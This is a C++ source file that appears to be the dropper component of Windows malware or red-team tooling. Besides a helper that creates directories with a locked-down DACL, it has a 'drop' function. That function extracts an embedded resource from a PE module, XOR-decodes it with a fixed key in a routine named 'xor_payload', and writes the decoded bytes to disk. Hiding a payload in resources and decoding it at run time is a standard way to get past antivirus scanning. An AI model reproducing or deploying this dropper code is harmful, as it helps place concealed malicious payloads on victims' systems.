#include <format>
#include <vector>
#include <expected>
#include "../common/string.hpp"
#include "../common/handle.hpp"
#include "../common/error.hpp"
#include "resource.hpp"

namespace resource {

std::expected<SECURITY_ATTRIBUTES, common::windows_error> create_dacl() {
	SECURITY_ATTRIBUTES sa{};
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = false;

    const wchar_t* str = L"D:(D;OICI;GA;;;BG)(D;OICI;GA;;;AN)(A;OICI;GRGWGX;;;AU)(A;OICI;GA;;;BA)";

	if (!::ConvertStringSecurityDescriptorToSecurityDescriptorW(
		str,
		SDDL_REVISION_1,
		&(sa.lpSecurityDescriptor),
		NULL
	)) {
		return std::unexpected{ common::get_last_error() };
	}

	return sa;
}

std::expected<std::wstring, common::windows_error> create_directory(const std::wstring& directory) {
    static const std::wstring separators(L"\\/");

    // If the specified directory name doesn't exist, do our thing
    DWORD attrs = ::GetFileAttributesW(directory.c_str());
    if (INVALID_FILE_ATTRIBUTES == attrs) {

        // Recursively do it all again for the parent directory, if any
        std::size_t slash_index = directory.find_last_of(separators);
        if (slash_index != std::wstring::npos) {
            create_directory(directory.substr(0, slash_index));
        }

		auto sa = create_dacl();
		if (!sa) {
			return std::unexpected{ sa.error() };
		}

        // Create the last directory on the path (the recursive calls will have taken
        // care of the parent directories by now)
        auto result = ::CreateDirectoryW(directory.c_str(), &sa.value());
		::LocalFree(sa.value().lpSecurityDescriptor);
        if (!result) {
			return std::unexpected{ common::get_last_error(
				std::format(
					"Could not create directory {}\n",
					common::wstring_to_string(directory)
			)) };
        }

    }
    else { // Specified directory name already exists as a file or directory

        bool is_dir = ((attrs & FILE_ATTRIBUTE_DIRECTORY) != 0) ||
            ((attrs & FILE_ATTRIBUTE_REPARSE_POINT) != 0);

        if (!is_dir) {
			return std::unexpected{ common::get_last_error(
				std::format(
					"{} is not a valid directory\n",
					common::wstring_to_string(directory)
			)) };
        }
    }

	return directory;
}

void xor_payload(char* buf, size_t size) {
	for (auto i = 0; i < size; i++) {
		buf[i] ^= 0xd3;
	}
}

std::expected<void, common::windows_error>
drop(int id, std::wstring path, HMODULE pe) {
	HRSRC info = ::FindResourceW(
		pe,
		MAKEINTRESOURCEW(id),
		MAKEINTRESOURCEW(10)
	);
	if (nullptr == info) {
		return std::unexpected{
			common::get_last_error(
				std::format(
					"Could not find resource {}",
					id
		)) };
	}

	HGLOBAL res = ::LoadResource(pe, info);
	if (nullptr == res) {
		return std::unexpected{
			common::get_last_error(
				std::format(
					"Could not load resource {}",
					id
		)) };
	}

	auto buffer = static_cast<char*>(::LockResource(res));
	if (nullptr == buffer) {
		return std::unexpected{
			common::get_last_error(
				std::format(
					"Resource {} is unavailable",
					id
		)) };
	}

	DWORD size = ::SizeofResource(pe, info);
	if (0 == size) {
		return std::unexpected{
			common::get_last_error(
				std::format(
					"Could not determine size of resource {}",
					id
		)) };
	}

	std::vector<char> writable_buffer{buffer, buffer + size};

	xor_payload(writable_buffer.data(), writable_buffer.size());

    // If GetFullPathName is called with a buffer size less than what it needs
    // it will return the length needed.
	std::wstring abs{};
    auto len = ::GetFullPathNameW(
        path.c_str(),
        abs.size(),
        abs.data(),
        nullptr 
    );

    abs.resize(len);
    len = ::GetFullPathNameW(
        path.c_str(),
        abs.size(),
        abs.data(),
        nullptr
    );

	common::unique_handle file = ::CreateFileW(
		abs.c_str(),
		GENERIC_WRITE,
		0,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);
	if (!file) {
		return std::unexpected{
			common::get_last_error(
				std::format(
					"Could not get handle to {}",
					common::wstring_to_string(path)
		)) };
	}

	if (!::WriteFile(
		file.get(),
		writable_buffer.data(),
		size,
		nullptr,
		nullptr
	)) {
		return std::unexpected{
			common::get_last_error(
				std::format(
					"Could not write to {}",
					common::wstring_to_string(path)
		)) };
	}

	return {};
}

}
